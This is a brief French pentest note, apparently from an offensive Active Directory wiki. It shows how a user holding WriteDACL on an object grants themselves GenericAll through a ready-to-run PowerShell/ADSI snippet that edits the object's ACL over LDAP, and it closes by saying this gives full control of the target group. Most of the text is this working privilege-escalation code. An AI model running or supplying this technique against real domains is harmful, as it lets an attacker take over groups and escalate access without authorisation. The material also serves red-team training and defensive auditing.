Avec le droit `WriteDACL`, il est possible d'attribuer soi-même des permissions à l'objet cible. Le plus simple est donc de s'attribuer le droit `GenericAll` sur cet objet.

> [!Attention]
> Le faire avec PowerView / Le module powershell ActiveDirectory ne semble pas fonctionner correctement, il faut le faire en écrivant directement sur le LDAP.

Attribuer le droit `GenericAll` à l'utilisateur `user` sur le groupe `test`

```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"

$IdentityReference = (New-Object System.Security.Principal.NTAccount("user")).Translate([System.Security.Principal.SecurityIdentifier])

$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"

$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)

$ADSI.psbase.commitchanges()
```

Il est maintenant possible d'avoir un contrôle total du groupe cible.